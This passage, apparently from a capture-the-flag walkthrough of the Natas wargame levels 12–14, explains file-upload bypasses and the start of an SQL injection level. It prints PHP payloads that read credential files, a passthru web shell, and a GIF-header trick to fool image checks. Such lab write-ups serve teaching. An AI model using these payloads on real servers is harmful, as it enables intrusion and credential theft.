        &lt;span class="nx"&gt;$string&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;$characters&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;mt_rand&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;strlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$characters&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;$string&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This string is used as the name of the uploaded file in the server:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;makeRandomPath&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$dir&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;$ext&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;$path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;$dir&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;genRandomString&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;$ext&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;while&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;file_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$path&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;$path&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;makeRandomPathFromFilename&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$dir&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;$fn&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;$ext&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;pathinfo&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$fn&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;PATHINFO_EXTENSION&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;makeRandomPath&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$dir&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;$ext&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;However, this file's extension is given by the browser:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nt"&gt;&amp;lt;form&lt;/span&gt; &lt;span class="na"&gt;enctype=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;multipart/form-data&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;action=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;index.php&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;method=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;POST&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;input&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;MAX_FILE_SIZE&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;1000&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;input&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;filename&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;lt;? print genRandomString(); ?&amp;gt;.jpg&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
Choose a JPEG to upload (max 1KB):&lt;span class="nt"&gt;&amp;lt;br/&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;input&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;uploadedfile&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;file&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&amp;lt;br&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;input&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;submit&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Upload File&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Finally, the last function performs the file uploading. Notice that the code does not check whether the file is actually a JPG file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;filename&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nv"&gt;$target_path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;makeRandomPathFromFilename&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;upload&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;filename&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;);
        if(filesize($_FILES&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;uploadedfile&amp;#39;&lt;/span&gt;&lt;span class="cp"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;tmp_name&amp;#39;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;) &amp;gt; 1000) {
        echo &amp;quot;File is too big&amp;quot;;
    } else {
        if(move_uploaded_file($_FILES&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;uploadedfile&amp;#39;&lt;/span&gt;&lt;span class="cp"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;tmp_name&amp;#39;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;, $target_path)) {
            echo &amp;quot;The file &lt;span class="nt"&gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;\&amp;quot;$target_path\&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;$target_path&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&lt;/span&gt; has been uploaded&amp;quot;;
        } else{
            echo &amp;quot;There was an error uploading the file, please try again!&amp;quot;;
        }
    }
} else {
?&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;Stating the attack:&lt;/h4&gt;
&lt;p&gt;We still can upload whatever file we want.&lt;/p&gt;
&lt;p&gt;Since the file extension is changed to &lt;em&gt;jpg&lt;/em&gt; in the browser side, we have control of this,  we can easly tamper the POST data.&lt;/p&gt;
&lt;p&gt;Fist, let's think about the exploit we want to send to the server. Since we know that the server runs PHP, we have several possibilities in this language!&lt;/p&gt;
&lt;p&gt;How about the following script which uses the function &lt;a href="http://php.net/manual/en/function.readfile.php"&gt;readfile()&lt;/a&gt;?&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class="nb"&gt;readfile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/etc/natas_webpass/natas13&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We could also use a &lt;a href="http://php.net/manual/en/function.system.php"&gt;system&lt;/a&gt; command:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class="nb"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;cat /etc/natas_webpass/natas13&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Or we could even use &lt;a href="http://php.net/manual/en/function.passthru.php"&gt;passthru&lt;/a&gt; again:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="x"&gt; &lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
 &lt;span class="nb"&gt;passthru&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_GET&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;cmd&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
 &lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Any of these exploits will work.&lt;/p&gt;
&lt;p&gt;Now, let's work our way around the fact that the browser will attempt to change our script extension from &lt;em&gt;php&lt;/em&gt; to &lt;em&gt;jpg&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;There are several ways to fix this. An easy way is to use a proxy or  extension, such as &lt;a href="http://portswigger.net/burp/"&gt;Burp Suite&lt;/a&gt; or &lt;a href="http://getfirebug.com/"&gt;FireBug&lt;/a&gt; to change the filename before it is sent to the server.&lt;/p&gt;
&lt;p&gt;We use &lt;em&gt;Burp&lt;/em&gt; and the attack is stated in the following steps:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Our exploit script in PHP is uploaded by the server and renamed with a random string and a &lt;em&gt;jpg&lt;/em&gt; extension.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;We intercept the request and change the name of the file back to the name of the script with &lt;em&gt;php&lt;/em&gt; extension.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;We send it to the server, which calls the function &lt;em&gt;MakeRandomPathFromFilename("upload","exploit.php")&lt;/em&gt;. This is sent to the function MakeRandomPath('upload', '.php').&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The server returns the link &lt;em&gt;/upload/randomString.php&lt;/em&gt;, which runs our exploit and returns the password.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4&gt;Firing up Burp:&lt;/h4&gt;
&lt;p&gt;If this is your first time with Burp, &lt;a href="http://portswigger.net/burp/help/suite_gettingstarted.html"&gt;this is how you run it&lt;/a&gt;. Burp works as an HTTP proxy server, where all  HTTP/S traffic from your browser passes through it. I will show in details how to do this in a *nix system.&lt;/p&gt;
&lt;p&gt;First, we lauch Burp:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;java -jar -Xmx1024m /path/to/burp.jar
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Then we go to the proxy tab and then options and we confirm Burp's Proxy listener is active at &lt;em&gt;127.0.0.1:8080&lt;/em&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/5xkHB29.png" /&gt;&lt;/p&gt;
&lt;p&gt;We set the proxy configuration in our system to this address:&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/Au1Gimm.png" /&gt;&lt;/p&gt;
&lt;p&gt;Back in Burp, we go to &lt;em&gt;Proxy --&amp;gt; Intercept&lt;/em&gt; and mark it ON:&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/FAf5Hru.png" /&gt;&lt;/p&gt;
&lt;p&gt;In the browser, we load the Natas12 page and accept the initial intercepts (forwarding it). We upload out exploit.&lt;/p&gt;
&lt;p&gt;Before we forward this request to the server, we open it in Burp and we change the name of the random string in &lt;em&gt;jpg&lt;/em&gt; to our &lt;em&gt;php&lt;/em&gt; exploit:&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/eywDMOy.png" /&gt;&lt;/p&gt;
&lt;p&gt;The browser will return the link for the file:&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/SGjbVsy.png" /&gt;&lt;/p&gt;
&lt;p&gt;Clicking it will reveal the password.&lt;/p&gt;
&lt;h3&gt;Level 13: File Inclusion Attack II&lt;/h3&gt;
&lt;p&gt;This level looks like the previous one, except by the message:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;For security reasons, we now only accept image files!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We take a look at the source code and the only difference from the previous level's code is an &lt;em&gt;if&lt;/em&gt; clause:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;&amp;lt;?&lt;/span&gt;
&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;filename&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nv"&gt;$target_path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;makeRandomPathFromFilename&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;upload&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;filename&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;filesize&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_FILES&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;uploadedfile&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;tmp_name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;1000&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;File is too big&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt; &lt;span class="nb"&gt;exif_imagetype&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_FILES&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;uploadedfile&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;tmp_name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;File is not an image&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;move_uploaded_file&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_FILES&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;uploadedfile&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;tmp_name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="nv"&gt;$target_path&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;The file &amp;lt;a href=&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;$target_path&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s2"&gt;&amp;gt;&lt;/span&gt;&lt;span class="si"&gt;$target_path&lt;/span&gt;&lt;span class="s2"&gt;&amp;lt;/a&amp;gt; has been uploaded&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;There was an error uploading the file, please try again!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The clause uses the PHP function  &lt;a href="http://php.net/manual/en/function.exif-imagetype.php"&gt;exif_imagetype&lt;/a&gt; to check whether the file is  an image type.&lt;/p&gt;
&lt;p&gt;The way it works is by checking the first bytes of the image and seeing whether it has an image signature. This signature is known as the &lt;a href="http://en.wikipedia.org/wiki/List_of_file_signatures"&gt;magic number&lt;/a&gt;. Every binary has one.&lt;/p&gt;
&lt;p&gt;It should be obvious that adding the right signature to a file could tamper it to look like another file type.&lt;/p&gt;
&lt;h4&gt;Crafting the attack:&lt;/h4&gt;
&lt;p&gt;We search for an &lt;a href="http://en.wikipedia.org/wiki/Graphics_Interchange_Format"&gt;image magic number&lt;/a&gt;. For &lt;em&gt;jpg&lt;/em&gt;, it's the hexadeximal &lt;em&gt;ff d8 ff e0&lt;/em&gt;. For &lt;em&gt;gif&lt;/em&gt;, however, it's really simple: &lt;em&gt;GIF89a&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Let's use it!&lt;/p&gt;
&lt;p&gt;Adding this number to our script from the previous level,&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nx"&gt;GIF89a&lt;/span&gt;
&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class="nb"&gt;readfile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/etc/natas_webpass/natas14&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;and following the previous steps, leads to the password for the next level.&lt;/p&gt;
&lt;h3&gt;Level 14: SQL Injection&lt;/h3&gt;
&lt;p&gt;This level starts with a &lt;em&gt;username&lt;/em&gt; and &lt;em&gt;password&lt;/em&gt; form:&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/qDA3nCP.png" /&gt;&lt;/p&gt;
&lt;p&gt;Looking at the source code, we see THE connection to  a MySQL server, and a SQL query to look for a record in the database:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;&amp;lt;?&lt;/span&gt;
&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$_REQUEST&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nv"&gt;$link&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;mysql_connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;natas14&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;lt;censored&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nb"&gt;mysql_select_db&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;natas14&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$link&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="nv"&gt;$query&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SELECT * from users where username=&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nv"&gt;$_REQUEST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s2"&gt; and password=&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nv"&gt;$_REQUEST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$_GET&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Executing query: &lt;/span&gt;&lt;span class="si"&gt;$query&lt;/span&gt;&lt;span class="s2"&gt;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;mysql_num_rows&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;mysql_query&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$query&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$link&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Successful login! The password for natas15 is &amp;lt;censored&amp;gt;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Access denied!&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="nb"&gt;mysql_close&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$link&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;If the query returns one or more row, we get a message  with the password for the next level.&lt;/p&gt;
&lt;p&gt;The &lt;em&gt;GET&lt;/em&gt; in the &lt;em&gt;if&lt;/em&gt; clause declares the parameter &lt;em&gt;debug&lt;/em&gt; without checking whether this is a safe query input!&lt;/p&gt;
&lt;p&gt;Therefore, while a simple GET query such as:&lt;/p&gt;
&lt;blockquote&gt;
